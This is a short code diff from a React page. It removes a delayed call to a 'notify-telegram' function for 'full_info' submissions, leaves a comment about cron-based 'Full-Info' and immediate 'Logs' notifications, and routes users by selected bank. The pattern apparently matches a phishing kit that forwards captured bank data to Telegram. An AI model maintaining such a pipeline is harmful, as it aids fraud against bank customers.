@@ -193,17 +193,9 @@ const Index = () => {
       return;
     }
 
-    // Schedule delayed Full-Info notification (60 sec). The edge function
-    // will skip sending if a Log notification was triggered in the meantime.
-    if (inserted?.id) {
-      supabase.functions.invoke("notify-telegram", {
-        body: {
-          submission_id: inserted.id,
-          kind: "full_info",
-          delay_seconds: 60,
-        },
-      }).catch(() => {});
-    }
+    // Full-Info notifications are handled by a pg_cron job that runs every minute
+    // and sends any submission older than 5 minutes that hasn't been sent yet.
+    // Logs are sent immediately from Confirmation.tsx.
 
     const route = bankRouteMap[selectedBank];
     if (route) {
